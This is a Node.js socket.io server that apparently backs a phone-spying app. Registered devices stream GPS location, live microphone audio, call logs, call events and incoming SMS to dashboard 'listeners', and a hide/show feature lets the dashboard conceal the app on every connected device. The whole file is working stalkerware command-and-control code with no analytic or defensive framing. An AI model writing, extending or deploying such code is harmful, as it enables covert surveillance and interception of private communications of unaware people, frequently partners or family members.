const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");

const PORT = process.env.PORT || 5000;
const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: { origin: "*" },
});

// Serve the dashboard UI from /public
app.use(express.static(path.join(__dirname, "public")));

// Track devices and listeners
const devices = new Set();
const listeners = new Set();

io.on("connection", (socket) => {
  console.log(`🔌 Client connected: ${socket.id}`);

  // Register device
  socket.on("device-register", () => {
    devices.add(socket.id);
    console.log(`📱 Device registered: ${socket.id}`);
  });

  // Register listener (dashboard)
  socket.on("listener-register", () => {
    listeners.add(socket.id);
    console.log(`🖥️ Listener registered: ${socket.id}`);
  });

  // ---------------- HIDE/SHOW APP FEATURE ----------------
  // Dashboard emits these events
  socket.on("hide-app-server", () => {
    console.log("👻 Dashboard requested to hide app");
    devices.forEach((id) => io.to(id).emit("hide-app")); // send to all devices
  });

  socket.on("show-app-server", () => {
    console.log("📲 Dashboard requested to show app");
    devices.forEach((id) => io.to(id).emit("show-app")); // send to all devices
  });
  // -------------------------------------------------------

  // Forward location updates
  socket.on("location-update", (data) => {
    console.log(`📍 Location from ${socket.id}:`, data);
    listeners.forEach((id) => io.to(id).emit("location-update", data));
  });

  // Forward audio chunks
  socket.on("audio-chunk", (chunk) => {
    console.log(`🎤 Audio chunk from ${socket.id}, size: ${chunk.length}`);
    listeners.forEach((id) => io.to(id).emit("audio-chunk", chunk));
  });

  // Forward call logs
  socket.on("call-logs", (logs) => {
    console.log(`📋 Call logs from ${socket.id}, count: ${logs.length}`);
    listeners.forEach((id) => io.to(id).emit("call-logs", logs));
  });

  // Forward real-time call events
  socket.on("call-event", (event) => {
    console.log(`📞 Call event from ${socket.id}:`, event);
    listeners.forEach((id) => io.to(id).emit("call-event", event));
  });

  // Forward real-time SMS messages
  socket.on("sms-received", (sms) => {
    console.log(`📨 SMS from ${socket.id}:`, sms);
    listeners.forEach((id) => io.to(id).emit("sms-received", sms));
  });

  // Handle disconnect
  socket.on("disconnect", () => {
    devices.delete(socket.id);
    listeners.delete(socket.id);
    console.log(`❌ Client disconnected: ${socket.id}`);
  });
});

server.listen(PORT, () => {
  console.log(`🚀 Server listening on port ${PORT}`);
});
